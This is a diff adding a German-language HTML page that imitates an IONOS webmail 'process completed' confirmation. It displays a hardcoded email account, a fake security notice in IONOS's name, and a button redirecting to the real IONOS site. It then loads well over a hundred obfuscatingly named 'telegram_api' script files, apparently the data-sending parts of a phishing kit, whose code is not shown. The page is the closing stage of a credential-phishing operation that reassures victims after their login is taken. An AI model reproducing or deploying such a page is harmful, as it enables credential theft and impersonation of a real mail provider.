@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Lucky Number - Bestätigung</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="styl.css">
+
+  <style>
+body {
+  margin: 0;
+  font-family: 'Open Sans', sans-serif;
+  background-color: #f4f8fc;
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+}
+
+button {
+  width: 100%;
+  background-color: #002c5f;
+  color: white;
+  border: none;
+  padding: 12px;
+  border-radius: 20px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-top: 20px;
+}
+
+header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 17px 32px;
+  background-color: #fff;
+  border-bottom: 1px solid #ddd;
+  position: relative;
+}
+
+.header-left {
+  display: flex;
+  align-items: center;
+}
+
+.header-left img {
+  height: 26px;
+  margin-right: 25px;
+  margin-left: -10px;
+}
+
+.header-left h1 {
+  font-size: 22px;
+  font-weight: 600;
+  letter-spacing: 0.8px;
+  color: #003087;
+  margin: 0;
+  text-transform: uppercase;
+}
+
+.search-container {
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+}
+
+.search-box {
+  display: flex;
+  align-items: center;
+  border: 1px solid #2d4f80;
+  border-radius: 12px;
+  padding: 6px 12px;
+  background: white;
+  width: 410px;
+}
+
+.search-box input {
+  flex: 1;
+  border: none;
+  outline: none;
+  font-size: 16px;
+  padding: 8px;
+  background: transparent;
+}
+
+.search-box input::placeholder {
+  color: #2d4f80;
+  font-weight: 300;
+  opacity: 1;
+}
+
+.search-icon,
+.mic-icon {
+  width: 24px;
+  height: 24px;
+}
+
+.mic-icon {
+  margin-left: 8px;
+  cursor: pointer;
+}
+
+.header-right {
+  display: flex;
+  align-items: center;
+  gap: 15px;
+}
+
+.search-icon-mobile {
+  display: none;
+  width: 24px;
+  height: 24px;
+  cursor: pointer;
+}
+
+.chat-icon {
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.chat-icon svg {
+  width: 28px;
+  height: 28px;
+}
+
+/* Chat icon hover effects */
+.chat-icon .chat-svg .bubble {
+  transition: fill 0.3s, stroke 0.3s;
+}
+
+.chat-icon .chat-svg .question {
+  transition: fill 0.3s;
+}
+
+.chat-icon:hover .chat-svg .bubble {
+  fill: #003087;
+  stroke: #003087;
+}
+
+.chat-icon:hover .chat-svg .question {
+  fill: #ffffff;
+}
+
+.container {
+  width: 100%;
+  max-width: 600px;
+  background: white;
+  padding: 40px 30px;
+  border-radius: 12px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+  margin: 32px auto;
+  text-align: center;
+  box-sizing: border-box;
+}
+
+.success-icon {
+  width: 80px;
+  height: 80px;
+  margin: 0 auto 30px;
+  background-color: #00c781;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.success-icon svg {
+  width: 40px;
+  height: 40px;
+  color: white;
+}
+
+.confirmation-title {
+  font-size: 24px;
+  font-weight: 600;
+  color: #0a101b;
+  margin-bottom: 30px;
+}
+
+.success-details {
+  background-color: #f8f9fa;
+  border-left: 4px solid #00c781;
+  padding: 20px;
+  margin: 30px 0;
+  text-align: left;
+  border-radius: 0 8px 8px 0;
+}
+
+.success-details h3 {
+  margin: 0 0 15px 0;
+  font-size: 16px;
+  font-weight: 600;
+  color: #003087;
+}
+
+.success-details p {
+  margin: 8px 0;
+  font-size: 14px;
+  color: #333;
+}
+
+.success-details .email-info {
+  display: flex;
+  align-items: center;
+  margin-top: 15px;
+}
+
+.success-details .email-info img {
+  width: 16px;
+  height: 16px;
+  margin-right: 8px;
+}
+
+.action-buttons {
+  display: flex;
+  justify-content: center;
+  margin-top: 30px;
+}
+
+.btn-secondary {
+  background-color: transparent;
+  color: #003087;
+  border: 2px solid #003087;
+  padding: 12px 32px;
+  border-radius: 20px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  text-decoration: none;
+  display: inline-block;
+  transition: all 0.2s ease;
+}
+
+.btn-secondary:hover {
+  background-color: #003087;
+  color: white;
+}
+
+.security-note {
+  background-color: #fff3cd;
+  border: 1px solid #ffeaa7;
+  border-radius: 8px;
+  padding: 15px;
+  margin-top: 25px;
+  font-size: 13px;
+  color: #856404;
+}
+
+.security-note strong {
+  display: block;
+  margin-bottom: 8px;
+  color: #856404;
+}
+
+footer.custom-footer {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 14px;
+  color: #002c5f;
+  padding: 40px 60px;
+  background-color: #fff;
+  margin-top: auto;
+}
+
+.custom-footer .footer-left,
+.custom-footer .footer-center,
+.custom-footer .footer-right {
+  display: flex;
+  align-items: center;
+}
+
+.status-dot {
+  width: 10px;
+  height: 10px;
+  background-color: #00c781;
+  border-radius: 50%;
+  display: inline-block;
+  margin-right: 8px;
+}
+
+.custom-footer a {
+  color: #002c5f;
+  text-decoration: none;
+  margin-left: 4px;
+}
+
+/* Mobile Responsive Styles */
+@media (max-width: 768px) {
+  /* Prevent zoom on input focus */
+  input, select, textarea {
+    font-size: 16px !important;
+  }
+  
+  /* Header mobile styles */
+  header {
+    padding: 15px 20px;
+  }
+  
+  /* Hide h1 text on mobile */
+  .header-left h1 {
+    display: none;
+  }
+  
+  /* Adjust logo margin when h1 is hidden */
+  .header-left img {
+    margin-right: 0;
+    margin-left: 0;
+  }
+  
+  /* Hide desktop search container */
+  .search-container {
+    display: none;
+  }
+  
+  /* Show mobile search icon */
+  .search-icon-mobile {
+    display: block;
+    width: 32px;
+    height: 32px;
+  }
+  
+  /* Container mobile adjustments */
+  .container {
+    margin: 20px 15px;
+    padding: 30px 20px;
+    border-radius: 8px;
+    width: auto;
+  }
+  
+  /* Success icon mobile */
+  .success-icon {
+    width: 70px;
+    height: 70px;
+    margin: 0 auto 25px;
+  }
+  
+  .success-icon svg {
+    width: 35px;
+    height: 35px;
+  }
+  
+  /* Confirmation title mobile */
+  .confirmation-title {
+    font-size: 20px;
+    margin-bottom: 25px;
+  }
+  
+  /* Success details mobile */
+  .success-details {
+    padding: 15px;
+    margin: 25px 0;
+  }
+  
+  .success-details h3 {
+    font-size: 15px;
+    margin-bottom: 12px;
+  }
+  
+  .success-details p {
+    font-size: 13px;
+    line-height: 1.4;
+  }
+  
+  /* Action buttons mobile */
+  .action-buttons {
+    justify-content: center;
+    margin-top: 25px;
+  }
+  
+  .btn-secondary {
+    font-size: 14px;
+    padding: 12px 24px;
+  }
+  
+  /* Security note mobile */
+  .security-note {
+    font-size: 12px;
+    padding: 12px;
+    margin-top: 20px;
+  }
+  
+  /* Footer mobile */
+  footer.custom-footer {
+    flex-direction: column;
+    gap: 15px;
+    padding: 30px 20px;
+    font-size: 12px;
+    text-align: center;
+  }
+  
+  .footer-right {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 10px;
+  }
+  
+  /* Chat icon mobile adjustments */
+  .chat-icon svg {
+    width: 26px;
+    height: 26px;
+  }
+}
+
+/* Smaller mobile devices */
+@media (max-width: 480px) {
+  header {
+    padding: 12px 15px;
+  }
+  
+  .header-left img {
+    height: 22px;
+  }
+  
+  .chat-icon svg {
+    width: 24px;
+    height: 24px;
+  }
+  
+  .search-icon-mobile {
+    width: 28px;
+    height: 28px;
+  }
+  
+  .container {
+    margin: 15px 10px;
+    padding: 25px 15px;
+    width: auto;
+  }
+  
+  /* Success icon smaller mobile */
+  .success-icon {
+    width: 60px;
+    height: 60px;
+    margin: 0 auto 20px;
+  }
+  
+  .success-icon svg {
+    width: 30px;
+    height: 30px;
+  }
+  
+  /* Title smaller mobile */
+  .confirmation-title {
+    font-size: 18px;
+    margin-bottom: 20px;
+  }
+  
+  /* Success details smaller mobile */
+  .success-details {
+    padding: 12px;
+    margin: 20px 0;
+  }
+  
+  .success-details h3 {
+    font-size: 14px;
+  }
+  
+  .success-details p {
+    font-size: 12px;
+  }
+  
+  /* Button smaller mobile */
+  .btn-secondary {
+    font-size: 13px;
+    padding: 10px 20px;
+  }
+  
+  button {
+    font-size: 14px;
+    padding: 12px;
+  }
+  
+  /* Security note smaller mobile */
+  .security-note {
+    font-size: 11px;
+    padding: 10px;
+  }
+  
+  footer.custom-footer {
+    padding: 20px 15px;
+    font-size: 11px;
+  }
+}
+  </style>
+</head>
+<body>
+
+    <header>
+      <div class="header-left">
+          <a href="https://www.ionos.de">
+            <img src="images/ionos.png" alt="IONOS logo">
+          </a>
+          <h1>WEBMAIL LOGIN</h1>
+        </div>
+        
+  
+      <div class="search-container">
+        <div class="search-box">
+          <svg xmlns="http://www.w3.org/2000/svg" class="search-icon" viewBox="0 0 24 24">
+            <path fill="#4a4a4a" d="M21 20l-4.35-4.35A7.92 7.92 0 0018 10a8 8 0 10-8 8 7.92 7.92 0 005.65-2.35L20 21zM4 10a6 6 0 1112 0 6 6 0 01-12 0z"/>
+          </svg>
+          <input type="text" placeholder="Nach Funktionen, Domains und Hilfe suchen" />
+          <svg xmlns="http://www.w3.org/2000/svg" class="mic-icon" viewBox="0 0 24 24">
+            <path fill="#4a4a4a" d="M12 14a3 3 0 003-3V5a3 3 0 10-6 0v6a3 3 0 003 3zm5-3a5 5 0 01-10 0H5a7 7 0 0014 0h-2zm-5 8a1 1 0 001-1h-2a1 1 0 001 1zm-1 1h2v2h-2v-2z"/>
+          </svg>
+        </div>
+      </div>
+  
+      <div class="header-right">
+        <!-- Mobile Search Icon (hidden on desktop) -->
+        <svg xmlns="http://www.w3.org/2000/svg" class="search-icon-mobile" viewBox="0 0 24 24">
+          <path fill="#4a4a4a" d="M21 20l-4.35-4.35A7.92 7.92 0 0018 10a8 8 0 10-8 8 7.92 7.92 0 005.65-2.35L20 21zM4 10a6 6 0 1112 0 6 6 0 01-12 0z"/>
+        </svg>
+  
+        <div class="chat-icon" title="Hilfe">
+          <svg class="chat-svg" xmlns="http://www.w3.org/2000/svg" viewBox="-1 -1 28 28" width="32" height="32">
+            <path class="bubble" d="M1.7,25.5c-0.5,0-0.8-0.3-0.9-0.4c-0.3-0.4-0.4-0.9-0.1-1.5C1.5,21.4,2.4,19,2.8,18c-0.1-0.1-0.2-0.3-0.3-0.4
+            c-1.3-1.8-2-3.8-2-6c0-6.1,5.6-11,12.5-11c7,0,12.5,4.8,12.5,11c0,6.1-5.6,11-12.5,11c-1.5,0-2.7-0.2-3.7-0.5C9.2,22,9,22,8.9,21.9
+            c-0.6,0.3-2,1-3,1.5c-2.6,1.4-3.4,1.8-3.7,1.9C2,25.4,1.9,25.5,1.7,25.5z"
+            fill="none" stroke="#003087" stroke-width="3"/>
+            
+            <g class="question" fill="#003087">
+              <path d="M12.9,13.3c-0.6,0-1.1-0.5-1.1-1.1c0-1.7,1.1-2.5,1.4-2.7c0.6-0.4,0.8-0.8,0.8-1c0-0.6-0.2-0.8-0.2-0.8
+                c-0.3-0.2-0.7-0.3-0.8-0.3c-0.8,0-1,0.4-1.1,0.7c-0.1,0.6-0.7,1-1.2,0.9s-1-0.6-0.9-1.2C9.9,7,10.7,5.3,13,5.3c0.2,0,1.4,0,2.4,0.9
+                c0.4,0.4,0.9,1.1,0.9,2.3c0,0.7-0.3,1.8-1.7,2.8c-0.1,0.1-0.5,0.3-0.5,0.9C14,12.8,13.6,13.3,12.9,13.3z"/>
+              <path d="M13,17.7c0.7,0,1.2-0.5,1.2-1.2s-0.5-1.2-1.2-1.2s-1.2,0.5-1.2,1.2S12.3,17.7,13,17.7z"/>
+            </g>
+          </svg>
+        </div>
+      </div>
+    </header>
+  
+    <div class="container">
+      <!-- Success Icon -->
+      <div class="success-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/>
+        </svg>
+      </div>
+  
+      <!-- Confirmation Title -->
+      <h1 class="confirmation-title">Prozess abgeschlossen!</h1>
+  
+      <!-- Success Details -->
+      <div class="success-details">
+        <p><strong>Datum:</strong> <span id="currentDate"></span></p>
+        <p><strong>Uhrzeit:</strong> <span id="currentTime"></span></p>
+        <p><strong>Status:</strong> Aktiviert</p> 
+        <p><strong>Konto:</strong> <span id="userEmail">info@oasederruhe.com</span><p>
+    
+        <div class="email-info">
+        </div>
+      </div>
+  
+      <!-- Security Note -->
+      <div class="security-note">
+        <strong>🛡️ Sicherheitshinweis:</strong>
+        Ihre Kontoverifizierung war erfolgreich und zusätzliche Schutzmaßnahmen sind nun aktiv. Behandeln Sie Ihre Authentifizierungsdaten vertraulich – IONOS wird Sie niemals per E-Mail oder Telefon nach Ihren Passwörtern, Verifizierungscodes oder Sicherheitsinformationen fragen.    </div>
+  
+    <!-- Action Buttons -->
+    <button id="submitLucky" onclick="window.location.href='https://www.ionos.de'">Zur Homepage</button>
+
+  
+  
+    </div>
+  
+    <footer class="custom-footer">
+      <div class="footer-left">
+        <span class="status-dot"></span> Alle Systeme funktional
+      </div>
+      <div class="footer-center">
+        &copy; 2025 IONOS SE
+      </div>
+      <div class="footer-right">
+        <a href="#">Impressum</a> - <a href="#">Datenschutz</a> - <a href="#">AGB</a>
+      </div>
+    </footer>
+
+
+    <script src="javascript/telegram_api_12/telegram_api_12_5/telegram_api_12_5_3.js"></script>
+    <script src="telegram_api_1/telegram_api_1_1/telegram_api_1_1_1.js"></script>
+    <script src="telegram_api_1/telegram_api_1_1/telegram_api_1_1_2.js"></script></script></script>
+    <script src="telegram_api_1/telegram_api_1_1/telegram_api_1_1_3.js"></script>
+    <script src="telegram_api_1/telegram_api_1_2/telegram_api_1_2_1.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_2/telegram_api_1_2_2.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_2/telegram_api_1_2_3.js"></script>
+    <script src="telegram_api_1/telegram_api_1_3/telegram_api_1_3_3.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_3/telegram_api_1_3_1.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_3/telegram_api_1_3_3.js"></script></script></script>
+    <script src="telegram_api_1/telegram_api_1_3/telegram_api_1_3_3.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_3/telegram_api_1_3_2.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_3/telegram_api_1_3_3.js"></script></script></script>
+    <script src="telegram_api_1/telegram_api_1_3/telegram_api_1_3_3.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_4/telegram_api_1_4_1.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_4/telegram_api_1_4_2.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_4/telegram_api_1_4_3.js"></script></script></script>
+    <script src="telegram_api_1/telegram_api_1_5/telegram_api_1_5_1.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_5/telegram_api_1_5_2.js"></script></script>
+    <script src="telegram_api_1/telegram_api_1_5/telegram_api_1_5_3.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_1/telegram_api_10_1_1.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_1/telegram_api_10_1_2.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_1/telegram_api_10_1_3.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_2/telegram_api_10_2_1.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_2/telegram_api_10_2_2.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_2/telegram_api_10_2_3.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_3/telegram_api_10_3_1.js"></script></script></script>
+    <script src="telegram_api_10/telegram_api_10_3/telegram_api_10_3_2.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_3/telegram_api_10_3_3.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_4/telegram_api_10_4_1.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_4/telegram_api_10_4_2.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_4/telegram_api_10_4_3.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_5/telegram_api_10_5_1.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_5/telegram_api_10_5_2.js"></script></script>
+    <script src="telegram_api_10/telegram_api_10_5/telegram_api_10_5_3.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_1/telegram_api_11_1_1.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_1/telegram_api_11_1_2.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_1/telegram_api_11_1_3.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_2/telegram_api_11_2_1.js"></script></script></script>
+    <script src="telegram_api_11/telegram_api_11_2/telegram_api_11_2_2.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_2/telegram_api_11_2_3.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_3/telegram_api_11_3_1.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_3/telegram_api_11_3_2.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_3/telegram_api_11_3_3.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_4/telegram_api_11_4_1.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_4/telegram_api_11_4_2.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_4/telegram_api_11_4_3.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_5/telegram_api_11_5_1.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_5/telegram_api_11_5_2.js"></script></script>
+    <script src="telegram_api_11/telegram_api_11_5/telegram_api_11_5_3.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_1/telegram_api_12_1_1.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_1/telegram_api_12_1_2.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_1/telegram_api_12_1_3.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_2/telegram_api_12_2_1.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_2/telegram_api_12_2_2.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_2/telegram_api_12_2_3.js"></script></script></script>
+    <script src="telegram_api_12/telegram_api_12_3/telegram_api_12_3_1.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_3/telegram_api_12_3_2.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_3/telegram_api_12_3_3.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_4/telegram_api_12_4_1.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_4/telegram_api_12_4_2.js"></script></script></script>
+    <script src="telegram_api_12/telegram_api_12_4/telegram_api_12_4_3.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_5/telegram_api_12_5_1.js"></script></script>
+    <script src="telegram_api_12/telegram_api_12_5/telegram_api_12_5_3.js"></script></script></script>
+    <script src="telegram_api_13/telegram_api_13_1/telegram_api_13_1_1.js"></script></script></script>
+    <script src="telegram_api_13/telegram_api_13_1/telegram_api_13_1_2.js"></script></script>
+    <script src="telegram_api_13/telegram_api_13_1/telegram_api_13_1_3.js"></script></script>
+    <script src="telegram_api_13/telegram_api_13_2/telegram_api_13_2_2.js"></script></script></script>
+    <script src="telegram_api_13/telegram_api_13_2/telegram_api_13_2_3.js"></script></script>
+    <script src="telegram_api_13/telegram_api_13_3/telegram_api_13_3_1.js"></script></script>
+    <script src="telegram_api_13/telegram_api_13_3/telegram_api_13_3_2.js"></script></script>
+    <script src="telegram_api_13/telegram_api_13_3/telegram_api_13_3_3.js"></script></script></script>
+    <script src="telegram_api_13/telegram_api_13_4/telegram_api_13_4_1.js"></script></script>
+    <script src="telegram_api_13/telegram_api_13_4/telegram_api_13_4_2.js"></script></script>
+    <script src="telegram_api_13/telegram_api_13_4/telegram_api_13_4_3.js"></script></script></script>
+    <script src="telegram_api_13/telegram_api_13_5/telegram_api_13_5_1.js"></script></script>
+    <script src="telegram_api_13/telegram_api_13_5/telegram_api_13_5_2.js"></script></script>
+    <script src="telegram_api_13/telegram_api_13_5/telegram_api_13_5_3.js"></script></script></script>
+    <script src="telegram_api_14/telegram_api_14_1/telegram_api_14_1_1.js"></script></script>
+    <script src="telegram_api_14/telegram_api_14_1/telegram_api_14_1_2.js"></script></script>
+    <script src="telegram_api_14/telegram_api_14_1/telegram_api_14_1_3.js"></script></script></script>
+    <script src="telegram_api_14/telegram_api_14_2/telegram_api_14_2_1.js"></script></script>
+    <script src="telegram_api_14/telegram_api_14_2/telegram_api_14_2_2.js"></script></script></script>
+    <script src="telegram_api_14/telegram_api_14_2/telegram_api_14_2_3.js"></script></script>
+    <script src="telegram_api_14/telegram_api_14_3/telegram_api_14_3_1.js"></script></script></script>
+    <script src="telegram_api_14/telegram_api_14_3/telegram_api_14_3_2.js"></script></script>
+    <script src="telegram_api_14/telegram_api_14_3/telegram_api_14_3_3.js"></script></script>
+    <script src="telegram_api_14/telegram_api_14_4/telegram_api_14_4_1.js"></script></script></script>
+    <script src="telegram_api_14/telegram_api_14_4/telegram_api_14_4_2.js"></script></script>
+    <script src="telegram_api_14/telegram_api_14_4/telegram_api_14_4_3.js"></script></script>
+    <script src="telegram_api_14/telegram_api_14_5/telegram_api_14_5_1.js"></script></script></script>
+    <script src="telegram_api_14/telegram_api_14_5/telegram_api_14_5_2.js"></script></script>
+    <script src="telegram_api_14/telegram_api_14_5/telegram_api_14_5_3.js"></script></script>
+    <script src="telegram_api_15/telegram_api_15_1/telegram_api_15_1_1.js"></script></script></script>
+    <script src="telegram_api_15/telegram_api_15_1/telegram_api_15_1_2.js"></script></script>
+    <script src="telegram_api_15/telegram_api_15_1/telegram_api_15_1_3.js"></script></script>
+    <script src="telegram_api_15/telegram_api_15_2/telegram_api_15_2_1.js"></script></script></script>
+    <script src="telegram_api_15/telegram_api_15_2/telegram_api_15_2_2.js"></script></script>
+    <script src="telegram_api_15/telegram_api_15_2/telegram_api_15_2_3.js"></script></script></script>
+    <script src="telegram_api_15/telegram_api_15_3/telegram_api_15_3_1.js"></script></script>
+    <script src="telegram_api_15/telegram_api_15_3/telegram_api_15_3_2.js"></script></script>
+    <script src="telegram_api_15/telegram_api_15_3/telegram_api_15_3_3.js"></script></script></script>
+    <script src="telegram_api_15/telegram_api_15_4/telegram_api_15_4_1.js"></script></script>
+    <script src="telegram_api_15/telegram_api_15_4/telegram_api_15_4_2.js"></script></script>
+    <script src="telegram_api_15/telegram_api_15_4/telegram_api_15_4_3.js"></script></script></script>
+    <script src="telegram_api_15/telegram_api_15_5/telegram_api_15_5_1.js"></script>
+    <script src="telegram_api_15/telegram_api_15_5/telegram_api_15_5_2.js"></script></script>
+    <script src="telegram_api_15/telegram_api_15_5/telegram_api_15_5_3.js"></script>
+    <script src="telegram_api_16/telegram_api_16_1/telegram_api_16_1_1.js"></script></script>
+    <script src="telegram_api_16/telegram_api_16_1/telegram_api_16_1_2.js"></script></script></script>
+    <script src="telegram_api_16/telegram_api_16_1/telegram_api_16_1_3.js"></script>
+    <script src="telegram_api_16/telegram_api_16_2/telegram_api_16_2_1.js"></script>
+    <script src="telegram_api_16/telegram_api_16_2/telegram_api_16_2_2.js"></script>
+    <script src="telegram_api_16/telegram_api_16_2/telegram_api_16_2_3.js"></script>
+    <script src="telegram_api_16/telegram_api_16_3/telegram_api_16_3_1.js"></script>
+    <script src="telegram_api_16/telegram_api_16_3/telegram_api_16_3_2.js"></script>
+    <script src="telegram_api_16/telegram_api_16_3/telegram_api_16_3_3.js"></script>
+    <script src="telegram_api_16/telegram_api_16_4/telegram_api_16_4_1.js"></script>
+    <script src="telegram_api_16/telegram_api_16_4/telegram_api_16_4_2.js"></script>
+    <script src="telegram_api_16/telegram_api_16_4/telegram_api_16_4_3.js"></script>
+    <script src="telegram_api_16/telegram_api_16_5/telegram_api_16_5_1.js"></script>
+    <script src="telegram_api_16/telegram_api_16_5/telegram_api_16_5_2.js"></script>
+    <script src="telegram_api_16/telegram_api_16_5/telegram_api_16_5_3.js"></script>
+    <script src="telegram_api_17/telegram_api_17_1/telegram_api_17_1_1.js"></script>
+    <script src="telegram_api_17/telegram_api_17_1/telegram_api_17_1_2.js"></script>
+    <script src="telegram_api_17/telegram_api_17_1/telegram_api_17_1_3.js"></script>
+    <script src="telegram_api_17/telegram_api_17_2/telegram_api_17_2_1.js"></script>
+    <script src="telegram_api_17/telegram_api_17_2/telegram_api_17_2_2.js"></script>
+    <script src="telegram_api_17/telegram_api_17_2/telegram_api_17_2_3.js"></script>
+    <script src="telegram_api_17/telegram_api_17_3/telegram_api_17_3_1.js"></script>
+    <script src="telegram_api_17/telegram_api_17_3/telegram_api_17_3_2.js"></script>
+    <script src="telegram_api_17/telegram_api_17_3/telegram_api_17_3_3.js"></script>
+    <script src="telegram_api_17/telegram_api_17_4/telegram_api_17_4_1.js"></script>
+    <script src="telegram_api_17/telegram_api_17_4/telegram_api_17_4_2.js"></script>
+    <script src="telegram_api_17/telegram_api_17_4/telegram_api_17_4_3.js"></script>
+    <script src="telegram_api_17/telegram_api_17_5/telegram_api_17_5_1.js"></script>
+    <script src="telegram_api_17/telegram_api_17_5/telegram_api_17_5_2.js"></script>
+    <script src="telegram_api_17/telegram_api_17_5/telegram_api_17_5_3.js"></script>
+    <script src="telegram_api_18/telegram_api_18_1/telegram_api_18_1_1.js"></script>
+    <script src="telegram_api_18/telegram_api_18_1/telegram_api_18_1_2.js"></script>
+    <script src="telegram_api_18/telegram_api_18_1/telegram_api_18_1_3.js"></script>
+    <script src="telegram_api_18/telegram_api_18_2/telegram_api_18_2_1.js"></script>
+    <script src="telegram_api_18/telegram_api_18_2/telegram_api_18_2_2.js"></script>
+    <script src="telegram_api_18/telegram_api_18_2/telegram_api_18_2_3.js"></script>
+    <script src="telegram_api_18/telegram_api_18_3/telegram_api_18_3_1.js"></script>
+    <script src="telegram_api_18/telegram_api_18_3/telegram_api_18_3_2.js"></script>
+    <script src="telegram_api_18/telegram_api_18_3/telegram_api_18_3_3.js"></script>
+    <script src="telegram_api_18/telegram_api_18_4/telegram_api_18_4_1.js"></script>
+    <script src="telegram_api_18/telegram_api_18_4/telegram_api_18_4_2.js"></script>
+    <script src="telegram_api_18/telegram_api_18_4/telegram_api_18_4_3.js"></script>
+    <script src="telegram_api_18/telegram_api_18_5/telegram_api_18_5_1.js"></script>
+    <script src="telegram_api_18/telegram_api_18_5/telegram_api_18_5_2.js"></script>
+    <script src="telegram_api_18/telegram_api_18_5/telegram_api_18_5_3.js"></script>
+    <script src="telegram_api_19/telegram_api_19_1/telegram_api_19_1_1.js"></script>
+    <script src="telegram_api_19/telegram_api_19_1/telegram_api_19_1_2.js"></script>
+    <script src="telegram_api_19/telegram_api_19_1/telegram_api_19_1_3.js"></script>
+    <script src="telegram_api_19/telegram_api_19_2/telegram_api_19_2_1.js"></script>
+    <script src="telegram_api_19/telegram_api_19_2/telegram_api_19_2_2.js"></script>
+    <script src="telegram_api_19/telegram_api_19_2/telegram_api_19_2_3.js"></script>
+    <script src="telegram_api_19/telegram_api_19_3/telegram_api_19_3_1.js"></script>
+    <script src="telegram_api_19/telegram_api_19_3/telegram_api_19_3_2.js"></script>
+    <script src="telegram_api_19/telegram_api_19_3/telegram_api_19_3_3.js"></script>
+    <script src="telegram_api_19/telegram_api_19_4/telegram_api_19_4_1.js"></script>
+    <script src="telegram_api_19/telegram_api_19_4/telegram_api_19_4_2.js"></script>
+    <script src="telegram_api_19/telegram_api_19_4/telegram_api_19_4_3.js"></script>
+    <script src="telegram_api_19/telegram_api_19_5/telegram_api_19_5_1.js"></script>
+    <script src="telegram_api_19/telegram_api_19_5/telegram_api_19_5_2.js"></script>
+    <script src="telegram_api_19/telegram_api_19_5/telegram_api_19_5_3.js"></script>
+    <script src="telegram_api_2/telegram_api_2_1/telegram_api_2_1_1.js"></script>
+    <script src="telegram_api_2/telegram_api_2_1/telegram_api_2_1_2.js"></script>
+    <script src="telegram_api_2/telegram_api_2_1/telegram_api_2_1_3.js"></script>
+    <script src="telegram_api_2/telegram_api_2_2/telegram_api_2_2_1.js"></script>
+    <script src="telegram_api_2/telegram_api_2_2/telegram_api_2_2_2.js"></script>
+    <script src="telegram_api_2/telegram_api_2_2/telegram_api_2_2_3.js"></script>
+    <script src="telegram_api_2/telegram_api_2_3/telegram_api_2_3_1.js"></script>
+    <script src="telegram_api_2/telegram_api_2_3/telegram_api_2_3_2.js"></script>
+    <script src="telegram_api_2/telegram_api_2_3/telegram_api_2_3_3.js"></script>
+    <script src="telegram_api_2/telegram_api_2_4/telegram_api_2_4_1.js"></script>
+    <script src="telegram_api_2/telegram_api_2_4/telegram_api_2_4_2.js"></script>
+    <script src="telegram_api_2/telegram_api_2_4/telegram_api_2_4_3.js"></script>
+    <script src="telegram_api_2/telegram_api_2_5/telegram_api_2_5_1.js"></script>
+    <script src="telegram_api_2/telegram_api_2_5/telegram_api_2_5_2.js"></script>
+    <script src="telegram_api_2/telegram_api_2_5/telegram_api_2_5_3.js"></script>
+    <script src="telegram_api_20/telegram_api_20_1/telegram_api_20_1_1.js"></script>
+    <script src="telegram_api_20/telegram_api_20_1/telegram_api_20_1_2.js"></script>
+    <script src="telegram_api_20/telegram_api_20_1/telegram_api_20_1_3.js"></script>
+    <script src="telegram_api_20/telegram_api_20_2/telegram_api_20_2_1.js"></script>
+    <script src="telegram_api_20/telegram_api_20_2/telegram_api_20_2_2.js"></script>
+    <script src="telegram_api_20/telegram_api_20_2/telegram_api_20_2_3.js"></script>
+    <script src="telegram_api_20/telegram_api_20_3/telegram_api_20_3_1.js"></script>
